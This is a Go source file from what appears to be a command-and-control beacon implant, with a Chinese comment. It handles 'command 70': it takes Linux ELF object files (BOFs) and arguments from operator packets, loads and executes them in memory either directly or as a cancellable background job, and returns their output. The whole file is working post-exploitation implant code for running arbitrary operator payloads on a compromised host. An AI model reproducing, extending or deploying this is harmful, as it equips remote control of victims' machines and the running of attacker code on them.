//go:build linux && amd64 && cgo

package command

import (
	"beacon/pkg/bof/elf"
	"beacon/pkg/jobs"
	"beacon/pkg/utils/encoding"
	"beacon/pkg/utils/packet"
	"fmt"

	"golang.org/x/sys/unix"
)

// BOFCommand 处理 command 70 的 Linux ELF BOF 执行请求。
type BOFCommand struct{}

func (c *BOFCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	objectBytes := p.ParseBytes()
	argBytes := p.ParseBytes()
	if p.HasError() {
		return nil, p.Error()
	}

	output, err := elf.Load(objectBytes, argBytes)
	if err != nil {
		return nil, err
	}

	return [][]byte{[]byte(encoding.ConvertCpToUTF8(output, acp))}, nil
}

func StartBOFJob(manager *jobs.Manager, sink func([]byte), taskID uint32, commandID uint32, p *packet.Parser, acp int) ([]byte, error) {
	objectBytes := p.ParseBytes()
	var argBytes []byte
	if !p.HasError() && p.Size() > 0 {
		argBytes = p.ParseBytes()
	}
	if p.HasError() {
		return nil, p.Error()
	}
	if p.Size() != 0 {
		return nil, fmt.Errorf("bof payload has trailing bytes")
	}
	if len(objectBytes) == 0 {
		return nil, fmt.Errorf("bof requires ELF object bytes")
	}
	if manager == nil {
		return nil, fmt.Errorf("job manager is not initialized")
	}

	objectCopy := append([]byte(nil), objectBytes...)
	argCopy := append([]byte(nil), argBytes...)
	stopFD, err := unix.Eventfd(0, unix.EFD_CLOEXEC|unix.EFD_NONBLOCK)
	if err != nil {
		return nil, fmt.Errorf("eventfd failed: %w", err)
	}

	job, err := manager.Create(taskID, commandID, jobs.TypeBOF, "bof")
	if err != nil {
		_ = unix.Close(stopFD)
		return nil, err
	}
	job.Detail = fmt.Sprintf("%d bytes", len(objectCopy))
	job.SetCancelHook(func() {
		_, _ = unix.Write(stopFD, []byte{1, 0, 0, 0, 0, 0, 0, 0})
	})

	manager.Start(job, func(job *jobs.Job) {
		defer unix.Close(stopFD)
		if job.Context().Err() != nil {
			emitBOFOutput(sink, taskID, commandID, []byte(fmt.Sprintf("BOF job %d canceled before start", taskID)))
			return
		}

		err := elf.LoadWithMethodOutputStopEvent(objectCopy, argCopy, "go", uintptr(stopFD), func(output string) {
			text := encoding.ConvertCpToUTF8(output, acp)
			emitBOFOutput(sink, taskID, commandID, []byte(text))
		})
		if err != nil && job.Context().Err() == nil {
			emitBOFOutput(sink, taskID, commandID, []byte(fmt.Sprintf("BOF: execution failed: %v", err)))
		}
	})

	return packet.PackArray([]any{[]byte(fmt.Sprintf("BOF job %d started", taskID))})
}
